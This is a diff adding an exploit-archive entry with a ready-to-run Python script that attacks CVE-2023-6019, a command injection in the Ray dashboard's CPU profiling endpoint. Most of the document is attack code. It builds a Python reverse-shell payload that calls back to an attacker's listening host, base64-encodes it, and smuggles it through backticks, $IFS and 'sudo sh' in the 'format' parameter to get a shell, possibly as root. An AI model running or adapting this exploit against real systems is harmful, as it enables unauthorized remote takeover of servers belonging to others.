@@ -1,0 +1,104 @@
+id: 39543
+date: 04/12/2024
+title: Ray OS v2.6.3 - Command Injection Exploit
+author: Fire_Wolf
+cves: CVE-2023-6019
+
+# Exploit Title: Ray OS v2.6.3 - Command Injection RCE(Unauthorized)
+# Description:
+#  The Ray Project dashboard contains a CPU profiling page, and the format parameter is
+#  not validated before being inserted into a system command executed in a shell, allowing
+#  for arbitrary command execution. If the system is configured to allow passwordless sudo
+#  (a setup some Ray configurations require) this will result in a root shell being returned
+#  to the user. If not configured, a user level shell will be returned
+# Version: <= 2.6.3
+# Date: 2024-4-10
+# Exploit Author: Fire_Wolf
+# Tested on: Ubuntu 20.04.6 LTS
+# Vendor Homepage: https://www.ray.io/
+# Software Link: https://github.com/ray-project/ray
+# CVE: CVE-2023-6019
+# Refer: https://huntr.com/bounties/d0290f3c-b302-4161-89f2-c13bb28b4cfe
+# ==========================================================================================
+
+# !usr/bin/python3
+# coding=utf-8
+import base64
+import argparse
+import requests
+import urllib3
+
+proxies = {"http": "127.0.0.1:8080"}
+headers = {
+    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
+}
+
+
+def check_url(target, port):
+    target_url = target + ":" + port
+    https = 0
+    if 'http' not in target:
+        try:
+            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+            test_url = 'http://' + target_url
+            response = requests.get(url=test_url, headers=headers, verify=False, timeout=3)
+            if response.status_code != 200:
+                is_https = 0
+                return is_https
+        except Exception as e:
+            print("ERROR! The Exception is:" + format(e))
+    if https == 1:
+        return "https://" + target_url
+    else:
+        return "http://" + target_url
+
+
+def exp(target,ip,lhost, lport):
+    payload = 'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("' + lhost + '",' + lport + '));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")\''
+    print("[*]Payload is: " + payload)
+    b64_payload = base64.b64encode(payload.encode())
+    print("[*]Base64 encoding payload is: " + b64_payload.decode())
+    exp_url = target + '/worker/cpu_profile?pid=3354&ip=' + str(ip) + '&duration=5&native=0&format=`echo ' + b64_payload.decode() + ' |base64$IFS-d|sudo%20sh`'
+    # response = requests.get(url=exp_url, headers=headers, verify=False, timeout=3, prxoy=proxiess)
+    print(exp_url)
+    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+    response = requests.get(url=exp_url, headers=headers, verify=False)
+    if response.status_code == 200:
+        print("[-]ERROR: Exploit Failed,please check the payload.")
+    else:
+        print("[+]Exploit is finished,please check your machine!")
+
+
+if __name__ == '__main__':
+    parser = argparse.ArgumentParser(
+        description='''
+         ⣀⡀⣀⡀⣀⡀⣀⡀⣀⡀⣀⡀⣀⡀⣀⡀⣀⡀⣀⡀⣀⡀⣀⡀⣀⡀⣀⡀⣀⡀⣀⡀⣀⡀⣀⡀⣀⡀⣀⡀⣀⡀⣀⡀⣀⡀⣀⡀⣀⡀
+        ⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄
+        ⡠⠄⡄⡄⡠⡀⣀⡀⢒⠄⡔⡄⢒⠄⢒⠄⣀⡀⣖⡂⡔⡄⢴⠄⣖⡆⠄⠄⡤⡀⡄⡄
+        ⠑⠂⠘⠄⠙⠂⠄⠄⠓⠂⠑⠁⠓⠂⠒⠁⠄⠄⠓⠃⠑⠁⠚⠂⠒⠃⠐⠄⠗⠁⠬⠃
+        
+        
+        
+                            ⢰⣱⢠⢠⠠⡦⢸⢄⢀⢄⢠⡠⠄⠄⢸⠍⠠⡅⢠⡠⢀⢄⠄⠄⢸⣸⢀⢄⠈⡇⠠⡯⠄
+                            ⠘⠘⠈⠚⠄⠓⠘⠘⠈⠊⠘⠄⠄⠁⠘⠄⠐⠓⠘⠄⠈⠓⠠⠤⠘⠙⠈⠊⠐⠓⠄⠃⠄
+        ⣀⡀⣀⡀⣀⡀⣀⡀⣀⡀⣀⡀⣀⡀⣀⡀⣀⡀⣀⡀⣀⡀⣀⡀⣀⡀⣀⡀⣀⡀⣀⡀⣀⡀⣀⡀⣀⡀⣀⡀⣀⡀⣀⡀⣀⡀⣀⡀⣀⡀
+        ⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄
+        ''',
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+    )
+    parser.add_argument('-t', '--target', type=str, required=True, help='tart ip')
+    parser.add_argument('-p', '--port', type=str, default=80, required=False, help='tart host port')
+    parser.add_argument('-L', '--lhost', type=str, required=True, help='listening host ip')
+    parser.add_argument('-P', '--lport', type=str, default=80, required=False, help='listening port')
+    args = parser.parse_args()
+    # target = args.target
+    ip = args.target
+    # port = args.port
+    # lhost = args.lhost
+    # lport = args.lport
+    targeturl = check_url(args.target, args.port)
+    print(targeturl)
+    print("[*] Checking in url: " + targeturl)
+    exp(targeturl, ip, args.lhost, args.lport)
+
+#  0day.today [2024-04-14]  #
